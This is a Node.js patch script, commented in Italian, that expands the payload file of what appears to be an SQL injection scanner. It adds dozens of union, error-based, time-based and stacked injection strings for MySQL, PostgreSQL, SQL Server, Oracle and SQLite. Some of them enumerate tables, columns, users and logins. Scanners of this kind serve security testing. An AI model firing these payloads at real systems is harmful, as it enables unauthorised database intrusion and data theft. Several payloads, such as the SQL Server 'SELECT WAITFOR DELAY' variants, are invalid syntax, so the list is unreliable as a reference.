// Patch payloads.js: espandere MySQL, PostgreSQL, SQL Server, Oracle, SQLite
// Questo script legge e riscrive il file con le espansioni necessarie.
import { readFileSync, writeFileSync } from 'fs';
import { execSync } from 'child_process';

const path = 'D:/projects/sqli-scanner/server/src/engine/payloads.js';
let src = readFileSync(path, 'utf8');

// La funzione replaceExact fa un replace esatto preservando il line ending
function replaceExact(oldText, newText) {
  // Prova prima con CRLF, poi con LF
  const oldCRLF = oldText.replace(/\n/g, '\r\n');
  const oldLF = oldText.replace(/\r\n/g, '\n');
  
  if (src.includes(oldCRLF)) {
    src = src.replace(oldCRLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  if (src.includes(oldLF)) {
    src = src.replace(oldLF, newText.replace(/\n/g, '\r\n'));
    return true;
  }
  return false;
}

// ========================================================================
// 1. MySQL stackato (3 -> 6)
// ========================================================================
const oldMyStack = `    stacked: [
      "{ORIG}; SLEEP({SLEEP}) {SEP}",
      "{ORIG}'; SLEEP({SLEEP}) {SEP}",
      '{ORIG}"; SLEEP({SLEEP}) {SEP}',
    ],
  },
  PostgreSQL: {`;

const newMyStack = `    stacked: [
      "{ORIG}; SLEEP({SLEEP}) {SEP}",
      "{ORIG}'; SLEEP({SLEEP}) {SEP}",
      '{ORIG}"; SLEEP({SLEEP}) {SEP}',
      "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}",
      "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}",
      "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}",
    ],
  },
  PostgreSQL: {`;

if (!replaceExact(oldMyStack, newMyStack)) {
  console.log('ERROR: MySQL stacked not found');
  process.exit(1);
}
console.log('MySQL stacked expanded');

// ========================================================================
// 2. PostgreSQL stackato (3 -> 6)
// ========================================================================
const oldPgStack = `    stacked: [
      "{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}",
      '{ORIG}"; SELECT pg_sleep({SLEEP}) {SEP}',
    ],
  };
  // SQLite:`;

const newPgStack = `    stacked: [
      "{ORIG}; SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; SELECT pg_sleep({SLEEP}) {SEP}",
      '{ORIG}"; SELECT pg_sleep({SLEEP}) {SEP}',
      "{ORIG}); SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}') ;SELECT pg_sleep({SLEEP}) {SEP}",
      "{ORIG}'; select pg_sleep({SLEEP}) {SEP}",
    ],
  };
  // SQLite:`;

if (!replaceExact(oldPgStack, newPgStack)) {
  console.log('ERROR: PostgreSQL stacked not found');
  process.exit(1);
}
console.log('PostgreSQL stacked expanded');

// ========================================================================
// 3. SQL Server completo (union 3->10, error 3->10, time 4->7, stacked 3->6)
// ========================================================================
const oldSs = `"SQL Server": {
    union: [
      "{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      '{ORIG}" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -',
    ],
    error: [
      "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      '{ORIG}" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -',
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG} WAITFOR DELAY '0:0:{SLEEP}'-- -",
    ],
    stacked: [
      "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
    ],
  },
  SQLite: {`;

const newSs = `"SQL Server": {
    union: [
      "{ORIG} UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      '{ORIG}" UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -',
      "{ORIG}) UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}') UNION SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG} UNION ALL SELECT {NUM},DB_NAME(),SYSTEM_USER-- -",
      "{ORIG}' UNION SELECT {NUM},@@VERSION,USER_NAME()-- -",
      "{ORIG}' UNION SELECT {NUM},DB_NAME(),@@SERVERNAME-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.databases WHERE database_id=DB_ID()),1-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT name FROM sys.syslogins WHERE name NOT IN ('sa') AND name != SYSTEM_USER),1-- -",
    ],
    error: [
      "{ORIG}' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      '{ORIG}" AND 1=CONVERT(int,(SELECT DB_NAME()))-- -',
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS int)-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT @@VERSION))-- -",
      "{ORIG}' AND 1=CAST((SELECT DB_NAME()) AS bigint)-- -",
      "{ORIG}' AND (SELECT (SELECT DB_NAME() FOR XML PATH(''))).value('a','int')-- -",
      "{ORIG}') AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.syslogins WHERE name=SYSTEM_USER))-- -",
      "{ORIG}' AND 1=CONVERT(int,(SELECT name FROM sys.databases WHERE database_id=DB_ID()))-- -",
      "{ORIG}' AND (SELECT (SELECT SYSTEM_USER FOR XML PATH(''))).value('a','int')-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
      "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG} WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}' AND WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}') WAITFOR DELAY '0:0:{SLEEP}'-- -",
      "{ORIG}) WAITFOR DELAY '0:0:{SLEEP}'-- -",
    ],
    stacked: [
      "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
      "{ORIG}); SELECT WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
      "{ORIG}'; SELECT @@VERSION {SEP}",
      "{ORIG}'; SELECT DB_NAME() {SEP}",
    ],
  },
  SQLite: {`;

if (!replaceExact(oldSs, newSs)) {
  console.log('ERROR: SQL Server section not found');
  process.exit(1);
}
console.log('SQL Server expanded');

// ========================================================================
// 4. Oracle completo (union 3->13, error 3->12, time 4->8)
// ========================================================================
const oldOra = `Oracle: {
    union: [
      "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
    ],
    error: [
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
      "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    ],
    stacked: [],
  },
};`;

const newOra = `Oracle: {
    union: [
      "{ORIG} UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      '{ORIG}" UNION SELECT {NUM},banner,NULL FROM v$version-- -',
      "{ORIG}) UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}') UNION SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG} UNION SELECT {NUM},version,'x' FROM v$instance-- -",
      "{ORIG} UNION SELECT {NUM},username,NULL FROM all_users WHERE ROWNUM=1-- -",
      "{ORIG}' UNION SELECT {NUM},banner,NULL FROM v$version WHERE ROWNUM=1-- -",
      "{ORIG} UNION ALL SELECT {NUM},banner,NULL FROM v$version-- -",
      "{ORIG}' UNION SELECT {NUM},global_name,NULL FROM global_name-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT table_name FROM all_tables WHERE ROWNUM=1),1 FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT column_name FROM all_tab_columns WHERE ROWNUM=1),1 FROM dual-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT username FROM all_users WHERE ROWNUM=1),1 FROM dual-- -",
    ],
    error: [
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      '{ORIG}" AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -',
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=XMLTYPE((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=UTL_RAW.CAST_TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -",
      "{ORIG}') AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))-- -",
      "{ORIG}' AND 1=DBMS_XMLGEN.GETXML((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
      "{ORIG}' AND 1=XMLTYPE(CURSOR(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
    ],
    boolean: [
      "{ORIG}' AND '1'='1",
      '{ORIG}" AND "1"="1',
      "{ORIG}' AND '1'='2",
      '{ORIG}" AND "1"="2',
      "{ORIG} AND 1=1",
      "{ORIG} AND 1=2",
      "{ORIG}' OR '1'='1",
      "{ORIG}' OR '1'='2",
    ],
    time: [
      "{ORIG}' AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}' AND (SELECT DBMS_LOCK.SLEEP({SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) FROM dual)=0-- -",
      "{ORIG} AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}') AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
      "{ORIG}' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',{SLEEP}) FROM dual) IS NULL-- -",
      "{ORIG}' AND (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP}) ELSE 0 END FROM dual)=0-- -",
      "{ORIG}) AND DBMS_PIPE.RECEIVE_MESSAGE('sqli',{SLEEP})=0-- -",
    ],
    stacked: [],
  },
};`;

if (!replaceExact(oldOra, newOra)) {
  console.log('ERROR: Oracle section not found');
  process.exit(1);
}
console.log('Oracle expanded');

// ========================================================================
// 5. SQLite stacked (2 -> 5)
// ========================================================================
const oldSqStack = `    stacked: [
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
    ],
  },
  Oracle: {`;

const newSqStack = `    stacked: [
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}'); SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d {SEP}",
      "{ORIG}; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e {SEP}",
      "{ORIG}'; SELECT count(*) FROM sqlite_master a, sqlite_master b, sqlite_master c, sqlite_master d, sqlite_master e, sqlite_master f {SEP}",
    ],
  },
  Oracle: {`;

if (!replaceExact(oldSqStack, newSqStack)) {
  console.log('ERROR: SQLite stacked not found');
  process.exit(1);
}
console.log('SQLite stacked expanded');

// ========================================================================
// 6. MySQL union (3 -> 10+) e error (3 -> 14+)
// ========================================================================
// MySQL union: 3 items -> 14 items
const oldMyUnion = `MySQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},database(),version()-- -",
      "{ORIG}' UNION SELECT {NUM},database(),version()-- -",
      '{ORIG}" UNION SELECT {NUM},database(),version()-- -',
    ],
    error: [`;

const newMyUnion = `MySQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},database(),version()-- -",
      "{ORIG}' UNION SELECT {NUM},database(),version()-- -",
      '{ORIG}" UNION SELECT {NUM},database(),version()-- -',
      "{ORIG}) UNION SELECT {NUM},database(),version()-- -",
      "{ORIG}') UNION SELECT {NUM},database(),version()-- -",
      "{ORIG} UNION ALL SELECT {NUM},database(),version()-- -",
      "{ORIG}' UNION ALL SELECT {NUM},database(),version()-- -",
      "{ORIG} UNION SELECT {NUM},@@version,user()-- -",
      "{ORIG} UNION SELECT {NUM},current_user(),database()-- -",
      "{ORIG}' UNION SELECT {NUM},version(),@@datadir-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273),1-- -",
      "{ORIG}' UNION SELECT {NUM},user(),@@basedir-- -",
    ],
    error: [`;

if (!replaceExact(oldMyUnion, newMyUnion)) {
  console.log('ERROR: MySQL union not found');
  process.exit(1);
}
console.log('MySQL union expanded');

// MySQL error: 3 items -> 14 items
const oldMyErr = `error: [
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ],
    boolean: [`;

const newMyErr = `error: [
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
      "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
      "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      "{ORIG}) AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
      "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -",
      "{ORIG} AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
      "{ORIG}' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
      "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))#",
      "{ORIG}) AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
      "{ORIG}' AND (SELECT * FROM (SELECT NAME_CONST((SELECT database()),1),NAME_CONST((SELECT version()),1)) a)-- -",
      "{ORIG}' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(user(),1)) a)-- -",
      "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT user())))#",
      "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT @@datadir)),1)-- -",
    ],
    boolean: [`;

if (!replaceExact(oldMyErr, newMyErr)) {
  console.log('ERROR: MySQL error not found');
  process.exit(1);
}
console.log('MySQL error expanded');

// ========================================================================
// 7. PostgreSQL union (3 -> 10+) e error (3 -> 14+)
// ========================================================================
const oldPgUnion = `PostgreSQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_user-- -",
      '{ORIG}" UNION SELECT {NUM},version(),current_user-- -',
    ],
    error: [`;

const newPgUnion = `PostgreSQL: {
    union: [
      "{ORIG} UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_user-- -",
      '{ORIG}" UNION SELECT {NUM},version(),current_user-- -',
      "{ORIG}) UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG}') UNION SELECT {NUM},version(),current_user-- -",
      "{ORIG} UNION ALL SELECT {NUM},version(),current_user-- -",
      "{ORIG}' UNION SELECT {NUM},current_database(),current_user-- -",
      "{ORIG} UNION SELECT {NUM},current_database(),version()-- -",
      "{ORIG}' UNION SELECT {NUM},version(),current_database()-- -",
      "{ORIG} UNION SELECT {NUM},current_user,version()-- -",
      "{ORIG}' UNION SELECT {NUM},(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'),1-- -",
    ],
    error: [`;

if (!replaceExact(oldPgUnion, newPgUnion)) {
  console.log('ERROR: PostgreSQL union not found');
  process.exit(1);
}
console.log('PostgreSQL union expanded');

const oldPgErr = `error: [
      "{ORIG}' AND CAST((SELECT version()) AS int)-- -",
      '{ORIG}" AND CAST((SELECT version()) AS int)-- -',
      "{ORIG}' AND 1=CAST((SELECT current_database()) AS int)-- -",
    ],
    boolean: [`;

const newPgErr = `error: [
      "{ORIG}' AND CAST((SELECT version()) AS int)-- -",
      '{ORIG}" AND CAST((SELECT version()) AS int)-- -',
      "{ORIG}' AND 1=CAST((SELECT current_database()) AS int)-- -",
      "{ORIG} AND CAST((SELECT version()) AS int)-- -",
      "{ORIG}') AND CAST((SELECT version()) AS int)-- -",
      "{ORIG}' AND 1/(SELECT CASE WHEN (SELECT version()) LIKE '%' THEN 0 ELSE 1 END)-- -",
      '{ORIG}" AND 1=CAST((SELECT current_database()) AS int)-- -',
      "{ORIG}' AND 1=CAST((SELECT user) AS int)-- -",
      "{ORIG}) AND 1=CAST((SELECT version()) AS int)-- -",
      "{ORIG}' AND CAST((SELECT version()) AS numeric)-- -",
      "{ORIG}' AND 1=CAST((SELECT current_setting('server_version')) AS int)-- -",
      "{ORIG}' AND 1/(SELECT CASE WHEN (SELECT current_user)='' THEN 0 ELSE 0 END)-- -",
      "{ORIG}' AND 1=CAST((SELECT current_schema) AS int)-- -",
      "{ORIG}' AND 1=CAST((SELECT inet_server_addr()) AS text)::int-- -",
    ],
    boolean: [`;

if (!replaceExact(oldPgErr, newPgErr)) {
  console.log('ERROR: PostgreSQL error not found');
  process.exit(1);
}
console.log('PostgreSQL error expanded');

// ========================================================================
// Scrittura finale
// ========================================================================
writeFileSync(path, src, 'utf8');
console.log('All patches applied successfully!');

// Verifica sintassi
try {
  execSync('node -c "' + path + '"', { encoding: 'utf8', stdio: 'pipe' });
  console.log('Syntax verification passed!');
} catch (e) {
  console.log('ERROR: Syntax error after patching');
  const stderr = e.stderr || '';
  console.log(stderr.substring(0, 1000));
  process.exit(1);
}